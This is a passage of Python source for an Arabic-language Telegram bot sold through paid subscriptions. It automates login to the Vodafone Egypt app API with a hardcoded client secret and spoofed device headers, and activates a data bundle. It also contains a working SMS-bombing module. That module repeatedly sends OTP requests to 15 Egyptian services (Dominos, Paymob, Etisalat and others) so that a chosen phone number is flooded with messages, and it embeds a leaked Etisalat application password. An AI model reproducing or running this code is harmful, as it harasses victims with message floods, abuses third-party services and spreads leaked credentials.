        # 1. تسجيل الدخول
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': number,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "true",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "LENOVO TB310XU",
            'x-agent-version': "2025.11.1",
            'x-agent-build': "1063",
            'digitalId': "2AXVRLXYD8QVF",
            'device-id': "e21f808017c900f3"
        }
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        if response.status_code != 200:
            return "❌ فشل تسجيل الدخول! تأكد من الرقم وكلمة المرور."

        token = response.json()['access_token']

        # 2. جلب encProductId للباقة MI_XC_CMBO_FlexActive_400
        url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
        params = {
            'relatedParty.id': number,
            '@type': "AllInOne",
            'relatedParty.name': "SubscriptionManagement"
        }
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "ProductInventoryManagementHost",
            'useCase': "AllInOne",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'device-id': "e09880bfe0a8924b",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A055F",
            'x-agent-version': "2026.3.2",
            'x-agent-build': "1130",
            'msisdn': number,
            'Content-Type': "application/json",
            'Accept-Language': "ar"
        }
        response = requests.get(url, params=params, headers=headers, timeout=30)
        data = response.json()
        enc = None
        for item in data:
            if item.get('@type') == 'MI' and item.get('productOffering', {}).get('id') == 'MI_XC_CMBO_FlexActive_400':
                enc = item['productOffering'].get('encProductId')
                break

        if not enc:
            return "❌ لم يتم العثور على الباقة المطلوبة لرقمك."

        # 3. تفعيل الباقة
        url = "https://mobile.vodafone.com.eg/services/dxl/orderor/productOrder"
        payload = {
            "payment": [
                {
                    "characteristics": [],
                    "@type": "balance"
                }
            ],
            "productOrderItem": [
                {
                    "characteristics": [
                        {
                            "name": "MSISDN",
                            "@type": "receiver",
                            "value": f"2{number}"
                        },
                        {
                            "name": "MSISDN",
                            "@type": "sender",
                            "value": f"2{number}"
                        }
                    ],
                    "itemTotalPrice": [
                        {
                            "price": {
                                "taxIncludedAmount": {
                                    "unit": "EGP",
                                    "value": 260.0
                                }
                            }
                        }
                    ],
                    "product": {
                        "id": "MI_XC_CMBO_FlexActive_400",
                        "productCharacteristic": [
                            {
                                "@type": "token",
                                "value": enc,
                                "valueType": "string"
                            }
                        ],
                        "type": "product"
                    },
                    "@type": "product"
                }
            ],
            "@type": "paymentMI"
        }

        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'device-id': "e09880bfe0a8924b",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A055F",
            'x-agent-version': "2026.3.2",
            'x-agent-build': "1130",
            'msisdn': number,
            'Accept-Language': "ar",
            'Content-Type': "application/json; charset=UTF-8"
        }

        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)

        if response.status_code == 200:
            return "✅ تم تفعيل عرض النت الشهر التاني بنجاح!"
        else:
            try:
                error_data = response.json()
                return f"❌ فشل التفعيل: {error_data.get('reason', response.text)}"
            except:
                return f"❌ فشل التفعيل (كود {response.status_code})"

    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def run_second_month_internet(user_id, message_id, session):
    """تشغيل عرض النت الشهر التاني باستخدام بيانات الجلسة"""
    try:
        # محاولة حذف الرسالة المؤقتة لتجنب خطأ "message is not modified"
        try:
            bot.delete_message(user_id, message_id)
        except:
            pass
        # إرسال رسالة جديدة
        loading_msg = bot.send_message(user_id, "⏳ جاري تفعيل عرض النت الشهر التاني...")
        result = activate_second_month_bundle(session['number'], session['password'])
        bot.edit_message_text(result, user_id, loading_msg.message_id)
    except Exception as e:
        bot.send_message(user_id, f"❌ خطأ: {str(e)}")

# ===== دوال إدارة القنوات الإجبارية =====
def admin_manage_channels_menu(user_id):
    """عرض قائمة إدارة القنوات الإجبارية"""
    text = "📢 إدارة القنوات الإجبارية\n\nاختر الإجراء المطلوب:"
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("➕ إضافة قناة", callback_data="admin_add_channel"),
        InlineKeyboardButton("🗑️ حذف قناة", callback_data="admin_remove_channel"),
        InlineKeyboardButton("📋 عرض القنوات", callback_data="admin_list_channels"),
        InlineKeyboardButton("🔙 رجوع", callback_data="back_to_admin")
    )
    bot.send_message(user_id, text, reply_markup=markup)

def admin_add_channel_start(user_id):
    """بدء عملية إضافة قناة جديدة"""
    bot.send_message(user_id, "➕ إضافة قناة جديدة\n\nأرسل اسم القناة:")
    save_user_state(user_id, step="admin_add_channel_name", action="admin_add_channel")

def admin_add_channel_name(user_id, name):
    """استلام اسم القناة"""
    save_user_state(user_id, step="admin_add_channel_link", action="admin_add_channel",
                   data={'name': name})
    bot.send_message(user_id, "🔗 أرسل رابط القناة (يبدأ بـ https://t.me/):")

def admin_add_channel_link(user_id, link):
    """استلام رابط القناة"""
    state = get_user_state(user_id)
    if not state:
        return
    name = state['data'].get('name')
    save_user_state(user_id, step="admin_add_channel_username", action="admin_add_channel",
                   data={'name': name, 'link': link})
    bot.send_message(user_id, "🆔 أرسل معرف القناة (يبدأ بـ @):")

def admin_add_channel_username(user_id, username):
    """استلام معرف القناة وإضافتها"""
    state = get_user_state(user_id)
    if not state:
        return
    name = state['data'].get('name')
    link = state['data'].get('link')
    if not username.startswith('@'):
        username = '@' + username
    add_required_channel(name, link, username)
    bot.send_message(user_id, f"✅ تم إضافة القناة {name} بنجاح!")
    clear_user_state(user_id)

def admin_remove_channel_list(user_id):
    """عرض قائمة القنوات للحذف"""
    channels = get_required_channels()
    if not channels:
        bot.send_message(user_id, "📭 لا توجد قنوات إجبارية حالياً.")
        return
    text = "🗑️ اختر القناة التي تريد حذفها:\n\n"
    markup = InlineKeyboardMarkup(row_width=1)
    for ch in channels:
        markup.add(InlineKeyboardButton(ch['name'], callback_data=f"admin_remove_channel_{ch['id']}"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_admin"))
    bot.send_message(user_id, text, reply_markup=markup)

def admin_remove_channel_confirm(user_id, channel_id):
    """تأكيد حذف قناة"""
    channels = get_required_channels()
    channel = next((ch for ch in channels if ch['id'] == channel_id), None)
    if not channel:
        bot.send_message(user_id, "❌ القناة غير موجودة!")
        return
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ تأكيد", callback_data=f"admin_remove_confirm_{channel_id}"),
        InlineKeyboardButton("❌ إلغاء", callback_data="admin_manage_channels")
    )
    bot.send_message(user_id, f"⚠️ هل أنت متأكد من حذف القناة {channel['name']}؟", reply_markup=markup)

def admin_list_channels(user_id):
    """عرض قائمة القنوات الإجبارية"""
    channels = get_required_channels()
    if not channels:
        text = "📭 لا توجد قنوات إجبارية حالياً."
    else:
        text = "📋 قائمة القنوات الإجبارية:\n\n"
        for i, ch in enumerate(channels, 1):
            text += f"{i}. {ch['name']}\n   {ch['link']}\n   {ch['username']}\n\n"
    bot.send_message(user_id, text, reply_markup=InlineKeyboardMarkup().add(
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_manage_channels")
    ))

def admin_change_dev_username(user_id):
    """بدء عملية تغيير يوزر المطور"""
    current = get_developer_username()
    bot.send_message(user_id, f"👤 يوزر المطور الحالي: {current}\n\nأرسل اليوزر الجديد (يبدأ بـ @):")
    save_user_state(user_id, step="admin_change_dev_username", action="admin_change_dev_username")

def admin_change_dev_username_save(user_id, new_username):
    """حفظ اليوزر الجديد"""
    if not new_username.startswith('@'):
        new_username = '@' + new_username
    set_developer_username(new_username, user_id)
    bot.send_message(user_id, f"✅ تم تغيير يوزر المطور إلى {new_username}")
    clear_user_state(user_id)

# ===== معالج الرسائل الرئيسي =====
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    
    if is_user_banned(user_id):
        bot.send_message(user_id, "🚫 لقد تم حظرك من استخدام البوت.")
        return
    
    cancel_all_next_steps(user_id)
    
    # إزالة الشعار (ASCII logo) حسب الطلب
    welcome_text = WELCOME_MESSAGE
    welcome_text += "\n\nتصلي على سيدنا محمد ﷺ"
    
    if not is_bot_running() and user_id not in ADMIN_IDS:
        bot.send_message(
            user_id,
            "⚠️ جاري تحديث البوت حاليًا، حاول لاحقًا.\n\n🕌 صلِّ على الحبيب محمد ﷺ\n\n🕋 اذكر الله - سبحان الله، الحمد لله، لا إله إلا الله، الله أكبر",
            reply_markup=None
        )
        return
    
    # التحقق من الاشتراك (قنوات + باقة)
    if user_id not in ADMIN_IDS:
        is_joined, markup, caption, days_left, end_date = check_subscription(user_id)
        if not is_joined:
            bot.send_message(user_id, caption, reply_markup=markup, disable_web_page_preview=True)
            return
    
    session = get_user_session(user_id)
    
    if session:
        # رسالة ترحيب مبسطة بعد تسجيل الدخول
        welcome_msg = f"مرحبا بك مرة أخرى {message.from_user.first_name}!\n\nيمكنك استخدام الخدمات."
        try:
            bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
        except telebot.apihelper.ApiTelegramException as e:
            if "message is not modified" not in str(e):
                bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
    else:
        if user_id in ADMIN_IDS:
            bot.send_message(user_id, welcome_text, reply_markup=create_main_keyboard_for_admin())
        else:
            bot.send_message(user_id, welcome_text, reply_markup=create_main_keyboard_for_user(user_id))
    
    if user_id in ADMIN_IDS:
        bot.send_message(user_id, "👑 لوحة تحكم المالك 👑\n\nاختر الأمر الذي تريده:", reply_markup=create_admin_keyboard())

@bot.message_handler(commands=['login'])
def login_command(message):
    user_id = message.chat.id
    
    if is_user_banned(user_id):
        bot.send_message(user_id, "🚫 لقد تم حظرك من استخدام البوت.")
        return
    
    cancel_all_next_steps(user_id)
    
    # التحقق من القنوات قبل تسجيل الدخول
    if user_id not in ADMIN_IDS:
        is_joined, markup, caption, days_left, end_date = check_subscription(user_id)
        if not is_joined:
            bot.send_message(user_id, caption, reply_markup=markup, disable_web_page_preview=True)
            return
    
    session = get_user_session(user_id)
    if session:
        bot.send_message(user_id, "✅ أنت مسجل دخول بالفعل!", reply_markup=create_all_services_keyboard(user_id))
        return
    
    bot.send_message(user_id, get_dynamic_message("login_step1"))
    save_user_state(user_id, step="get_login_number", action="login")

@bot.message_handler(commands=['logout'])
def logout_command(message):
    user_id = message.chat.id
    logout_user(user_id)
    cancel_all_next_steps(user_id)
    if user_id in ADMIN_IDS:
        bot.send_message(user_id, "✅ تم تسجيل الخروج بنجاح!", reply_markup=create_main_keyboard_for_admin())
    else:
        bot.send_message(user_id, "✅ تم تسجيل الخروج بنجاح!", reply_markup=create_main_keyboard_for_user(user_id))

@bot.message_handler(commands=['cancel'])
def cancel_command(message):
    user_id = message.chat.id
    cancel_all_next_steps(user_id)
    if user_id in ADMIN_IDS:
        bot.send_message(user_id, "✅ تم إلغاء العملية الحالية.", reply_markup=create_main_keyboard_for_admin())
    else:
        bot.send_message(user_id, "✅ تم إلغاء العملية الحالية.", reply_markup=create_main_keyboard_for_user(user_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.chat.id
    help_text = """
📚 قائمة الأوامر المتاحة:

/start - بدء استخدام البوت
/login - تسجيل الدخول
/logout - تسجيل الخروج
/cancel - إلغاء العملية الحالية
/help - عرض هذه الرسالة
/settings - إعدادات البوت (للمالك فقط)
/premium - معلومات الاشتراك المميز

للاستفادة من الخدمات، يجب تسجيل الدخول أولاً.
تصلي على سيدنا محمد ﷺ
    """
    bot.send_message(user_id, help_text)

@bot.message_handler(commands=['settings'])
def settings_command(message):
    user_id = message.chat.id
    if user_id not in ADMIN_IDS:
        bot.send_message(user_id, "🚫 هذه الخاصية متاحة للمالك فقط.")
        return
    
    bot.send_message(user_id, "👑 لوحة تحكم المالك 👑\n\nاختر الأمر الذي تريده:", reply_markup=create_admin_keyboard())

@bot.message_handler(commands=['premium'])
def premium_command(message):
    user_id = message.chat.id
    is_active, days_left, end_date = check_subscription_db(user_id)
    if is_active:
        end_str = end_date.strftime('%Y-%m-%d') if end_date else "غير محدد"
        msg = f"🌟 اشتراكك المميز نشط!\n\n📅 الأيام المتبقية: {days_left}\n📆 تاريخ الانتهاء: {end_str}"
    else:
        cash_number = get_vodafone_cash_number()
        msg = f"🚫 ليس لديك اشتراك مميز.\n\nاختر الخطة المناسبة من قائمة الاشتراك."
        # عرض الخطط
        show_premium_plans(user_id, None)
        return
    bot.send_message(user_id, msg)

# ===== معالج أوامر المطور للاشتراك المميز =====
@bot.message_handler(commands=['accept'])
def accept_subscription_command(message):
    user_id = message.chat.id
    if user_id not in ADMIN_IDS:
        return
    
    parts = message.text.split('_')
    if len(parts) != 2:
        bot.send_message(user_id, "❌ استخدام: /accept_<user_id>")
        return
    
    try:
        target_user = int(parts[1])
    except:
        bot.send_message(user_id, "❌ معرف المستخدم غير صحيح.")
        return
    
    # إضافة اشتراك 30 يوم (افتراضي)
    new_end_date = add_subscription(target_user, SUBSCRIPTION_DURATION_DAYS, user_id)
    bot.send_message(user_id, f"✅ تم تفعيل الاشتراك للمستخدم {target_user} حتى {new_end_date.strftime('%Y-%m-%d')}.")
    # إبلاغ المستخدم
    try:
        bot.send_message(target_user, f"✅ تمت الموافقة على طلب اشتراكك المميز لمدة {SUBSCRIPTION_DURATION_DAYS} يوم.")
    except:
        pass

@bot.message_handler(commands=['reject'])
def reject_subscription_command(message):
    user_id = message.chat.id
    if user_id not in ADMIN_IDS:
        return
    
    parts = message.text.split('_')
    if len(parts) != 2:
        bot.send_message(user_id, "❌ استخدام: /reject_<user_id>")
        return
    
    try:
        target_user = int(parts[1])
    except:
        bot.send_message(user_id, "❌ معرف المستخدم غير صحيح.")
        return
    
    bot.send_message(user_id, f"❌ تم رفض طلب الاشتراك للمستخدم {target_user}.")
    # إبلاغ المستخدم
    try:
        bot.send_message(target_user, "❌ تم رفض طلب اشتراكك المميز. يرجى التواصل مع المطور.")
    except:
        pass

# ===== دوال السبام (مأخوذة من text 17.py) =====
# بيانات السبام (في الذاكرة)
spam_data = {}          # user_id -> {number: {'count': x, 'delay': y}}
stop_flags = {}         # user_id -> bool

# دوال الخدمات (15 خدمة) - نسخة معدلة للعمل مع aiohttp
async def send_4swapp(phone):
    try:
        async with aiohttp.ClientSession() as session:
            params = {'phoneNumber': phone}
            headers = {
                'accept': 'application/json,text/plain,*/*',
                'accept-language': 'ar-eg',
                'origin': 'https://4sw.app',
                'referer': 'https://4sw.app/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            async with session.get('https://identity.4sw.app/api/account/generateotpforregistration',
                                   params=params, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "4sw.app"
    except Exception as e:
        return False, str(e)[:50], "4sw.app"

async def send_zumrafood(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'ar-eg',
                'client': 'web',
                'content-type': 'application/json',
                'origin': 'https://www.zumrafood.com',
                'referer': 'https://www.zumrafood.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'mobile': phone, 'channel': 'SMS'}
            async with session.put('https://api.zumrafood.com/auth/otp-request',
                                   headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "ZumraFood"
    except Exception as e:
        return False, str(e)[:50], "ZumraFood"

async def send_aladwaa(phone):
    try:
        async with aiohttp.ClientSession() as session:
            first_names = ['محمد', 'أحمد', 'محمود', 'خالد', 'علي']
            last_names = ['علي', 'حسن', 'عبدالله', 'فاروق', 'سليمان']
            name = f"{random.choice(first_names)} {random.choice(last_names)}"
            cookies = {
                '_ga': 'GA1.1.1249197690.1761854708',
                '_gcl_au': '1.1.2114002380.1761854709',
                'adwaaAuth': '...',
            }
            headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://aladwaa.com',
                'referer': 'https://aladwaa.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {
                'action': 'aladwaa_register_api',
                'name': name,
                'phone': phone,
                'type': '1',
                'nonce': 'd81773836b',
            }
            async with session.post('https://aladwaa.com/wp-admin/admin-ajax.php',
                                    cookies=cookies, headers=headers, data=data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Aladwaa"
    except Exception as e:
        return False, str(e)[:50], "Aladwaa"

async def send_sylndr_sms(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://sylndr.com',
                'referer': 'https://sylndr.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'phone': phone, 'language': 'ar'}
            async with session.post('https://otp.sylndr.com/api/v1.0/otp/sms/send',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Sylndr_SMS"
    except Exception as e:
        return False, str(e)[:50], "Sylndr_SMS"

async def send_tayyibafarms(phone):
    try:
        async with aiohttp.ClientSession() as session:
            cookies = {'OCSESSID': '9bf4c02574d7429ece6773eafe'}
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.tayyibafarms.com',
                'referer': 'https://www.tayyibafarms.com/index.php?route=account/register&popup=register',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {'telephone': phone}
            async with session.post('https://www.tayyibafarms.com/index.php?route=extension/tmdsms/verifytelephone/chkphonenumber',
                                    cookies=cookies, headers=headers, data=data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "TayyibaFarms"
    except Exception as e:
        return False, str(e)[:50], "TayyibaFarms"

async def send_desertcart(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/vnd.api+json; version:3.0',
                'content-type': 'application/json',
                'origin': 'https://www.desertcart.com.eg',
                'referer': 'https://www.desertcart.com.eg/ar',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-locale': 'ar-eg',
            }
            json_data = {
                'login': phone,
                'recaptcha': {'token': 'auto', 'key': 2, 'version': 'V3'},
                'referral_code': None,
                'sign_up_code': None,
            }
            async with session.post('https://www.desertcart.com.eg/api/sessions',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "DesertCart"
    except Exception as e:
        return False, str(e)[:50], "DesertCart"

async def send_sylndr_whatsapp(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://sylndr.com',
                'referer': 'https://sylndr.com/',
                'user-agent': random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                ]),
            }
            json_data = {'phone': phone, 'language': 'ar', 'channel': 'whatsapp'}
            async with session.post('https://otp.sylndr.com/api/v1.0/otp/sms/resend',
                                    headers=headers, json=json_data, timeout=15) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Sylndr_WhatsApp"
    except Exception as e:
        return False, str(e)[:50], "Sylndr_WhatsApp"

async def send_dominos(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/json; charset=UTF-8',
                'dpz-language': 'ar',
                'dpz-market': 'EGYPT',
                'origin': 'https://order.golo03.dominos.com',
                'referer': 'https://order.golo03.dominos.com/assets/build/xdomain/proxy.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-dpz-d': '64027d22-a044-4d7c-9efc-d92df804433e',
            }
            json_data = {'phoneNumber': phone, 'market': 'EGYPT', 'locale': 'ar-EG', 'challenge': 'PHONE'}
            async with session.post('https://order.golo03.dominos.com/power/otpVerification/_send',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Dominos"
    except Exception as e:
        return False, str(e)[:50], "Dominos"

async def send_twist_tv(phone):
    try:
        async with aiohttp.ClientSession() as session:
            url = "https://ev-api.aws.playco.com/api/v1.0/eg/twist/send-otp"
            payload = {"phoneNumber": f"2{phone}" if not phone.startswith("2") else phone}
            headers = {
                'User-Agent': "Twist TV/StarzAPP(com.twist.tv;build:2032;Android:12)",
                'Content-Type': 'application/json; charset=UTF-8',
                'Client-Type': 'Android',
            }
            async with session.post(url, json=payload, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Twist_TV"
    except Exception as e:
        return False, str(e)[:50], "Twist_TV"

async def send_paymob(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://accept.paymob.com',
                'referer': 'https://accept.paymob.com/portal2/ar/forgetpassword',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'username': phone}
            async with session.post('https://accept.paymob.com/api/auth/reset_pass/request_otp',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Paymob"
    except Exception as e:
        return False, str(e)[:50], "Paymob"

async def send_etisalat_web(phone):
    try:
        async with aiohttp.ClientSession() as session:
            dial = phone
            import base64
            udid = base64.b64encode(phone.encode()).decode()
            url = f'https://www.etisalat.eg/Saytar/rest/quickAccess/site/sendVerCodeQuickAccessV2?sendVerCodeQuickAccessRequest=%3CsendVerCodeQuickAccessRequest%3E%3Cdial%3E{dial}%3C/dial%3E%3Cudid%3E{udid}%3C/udid%3E%3C/sendVerCodeQuickAccessRequest%3E'
            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'text/xml',
                'Referer': 'https://www.etisalat.eg/eshop2/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'applicationName': 'MAB',
                'applicationPassword': 'ZFZyqUpqeO9TMhXg4R/9qs0Igwg=',
            }
            async with session.get(url, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Etisalat"
    except Exception as e:
        return False, str(e)[:50], "Etisalat"

async def send_zumrahub(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'ar-eg',
                'client': 'web',
                'content-type': 'application/json',
                'origin': 'https://zumrahub.com',
                'referer': 'https://zumrahub.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'mobile': phone, 'channel': 'SMS'}
            async with session.put('https://api.zumrahub.com/auth/otp-request/mobile',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Zumrahub"
    except Exception as e:
        return False, str(e)[:50], "Zumrahub"

async def send_gourmet_egypt(phone):
    try:
        async with aiohttp.ClientSession() as session:
            if phone.startswith('01') and not phone.startswith('201'):
                formatted_phone = '2' + phone
            else:
                formatted_phone = phone
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://gourmetegypt.com',
                'referer': 'https://gourmetegypt.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {'mobile_number': formatted_phone}
            async with session.post('https://gourmetegypt.com/customermobile/account/mobilesendcode/',
                                    headers=headers, data=data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Gourmet_Egypt"
    except Exception as e:
        return False, str(e)[:50], "Gourmet_Egypt"

async def send_aman(phone):
    # نفس send_tayyibafarms
    return await send_tayyibafarms(phone)

async def send_backup_service(phone):
    await asyncio.sleep(0.1)
    return True, "Success", "Backup_Service"

# دالة إرسال جميع الخدمات بشكل متوازي
async def send_all_services(phone):
    service_functions = [
        send_4swapp, send_zumrafood, send_aladwaa, send_sylndr_sms,
        send_tayyibafarms, send_desertcart, send_sylndr_whatsapp,
        send_dominos, send_twist_tv, send_paymob, send_etisalat_web,
        send_zumrahub, send_gourmet_egypt, send_aman, send_backup_service
    ]
    # تنفيذ جميع الخدمات بشكل متوازي
    results = await asyncio.gather(*(func(phone) for func in service_functions), return_exceptions=True)
    formatted_results = []
    for i, res in enumerate(results):
        if isinstance(res, Exception):
            formatted_results.append({'service_name': service_functions[i].__name__, 'success': False, 'response_preview': str(res)[:50]})
        else:
            success, resp, name = res
            formatted_results.append({'service_name': name, 'success': success, 'response_preview': resp})
    return formatted_results

# دالة إنشاء نص التقدم للسبام
def build_spam_progress_text(numbers_list, progress, total_success, total_attempts, current_number, current_msg_index, delay):
    lines = ["🚀 **جاري إرسال الرسائل...**\n"]
    lines.append("📞 **الأرقام:**")
    for num in numbers_list:
        if num in progress:
            done = progress[num]['sent']
            total = progress[num]['total']
            percent = (done / total * 100) if total > 0 else 0
            status = f"{done}/{total} ({percent:.1f}%)"
            if num == current_number:
                status += f" ← إرسال {current_msg_index}/{total}"
            lines.append(f"  • {num}: {status}")
        else:
            lines.append(f"  • {num}: 0/{progress.get(num, {}).get('total', 0)} (0%)")
    lines.append("")
    if total_attempts > 0:
        success_rate = (total_success / total_attempts * 100) if total_attempts > 0 else 0
        lines.append(f"📊 **إجمالي الخدمات الناجحة:** {total_success}/{total_attempts} ({success_rate:.1f}%)")
    lines.append(f"⏰ **الرسالة التالية بعد:** {delay} ثانية")
    return "\n".join(lines)

# دالة تشغيل مهمة السبام في ثريد منفصل
def run_spam_task(user_id, numbers_list, bot_instance, chat_id, message_id):
    # إنشاء حلقة حدث جديدة
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(spam_send_task(user_id, numbers_list, bot_instance, chat_id, message_id))
    finally:
        loop.close()

async def spam_send_task(user_id, numbers_list, bot_instance, chat_id, message_id):
    stop_flags[user_id] = False
    progress = {}
    for num in numbers_list:
        info = spam_data[user_id][num]
        progress[num] = {'total': info['count'], 'sent': 0}

    total_success = 0
    total_attempts = 0
    current_number = numbers_list[0] if numbers_list else None
    current_msg_index = 0
    stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 إيقاف العملية", callback_data="spam_stop")]])

    for number in numbers_list:
        if stop_flags.get(user_id):
            break
        info = spam_data[user_id][number]
        count = info['count']
        delay = info['delay']
        current_number = number

        for i in range(count):
            if stop_flags.get(user_id):
                break
            current_msg_index = i + 1
            progress[number]['sent'] = i + 1

            # إرسال جميع الخدمات بشكل غير متزامن
            results = await send_all_services(number)

            success_count = sum(1 for r in results if r['success'])
            total_success += success_count
            total_attempts += len(results)

            text = build_spam_progress_text(
                numbers_list, progress, total_success, total_attempts,
                current_number, current_msg_index, delay
            )

            try:
                await bot_instance.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    reply_markup=stop_keyboard,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"فشل تحديث الرسالة: {e}")

            if i < count - 1 and not stop_flags.get(user_id):
                await asyncio.sleep(delay)

    if stop_flags.get(user_id):
        final_text = "🛑 **تم إيقاف الإرسال.**\n" + text.split("🛑")[0]
    else:
        final_text = "✅ **تم الانتهاء من إرسال جميع الرسائل بنجاح!**\n" + text.split("⏰")[0]

    try:
        await bot_instance.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            reply_markup=None,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"فشل تحديث الرسالة النهائية: {e}")

# ===== معالج الرسائل النصية (معدل ليشمل خطوات السبام وزر الاشتراك المميز والأنظمة الجديدة) =====
@bot.message_handler(func=lambda message: True)
def handle_keyboard_buttons(message):
    user_id = message.chat.id
    text = message.text
    
    if is_user_banned(user_id):
        bot.send_message(user_id, "🚫 لقد تم حظرك من استخدام البوت.")
        return
    
    if not is_bot_running() and user_id not in ADMIN_IDS:
        bot.send_message(
            user_id,
            "⚠️ جاري تحديث البوت حاليًا، حاول لاحقًا.\n\n🕌 صلِّ على الحبيب محمد ﷺ\n\n🕋 اذكر الله - سبحان الله، الحمد لله، لا إله إلا الله، الله أكبر",
            reply_markup=None
        )
        return
    
    # التحقق من الاشتراك (قنوات + باقة)
    if user_id not in ADMIN_IDS:
        is_joined, markup, caption, days_left, end_date = check_subscription(user_id)
        if not is_joined:
            bot.send_message(user_id, caption, reply_markup=markup, disable_web_page_preview=True)
            return
    
    user_state = get_user_state(user_id)
    
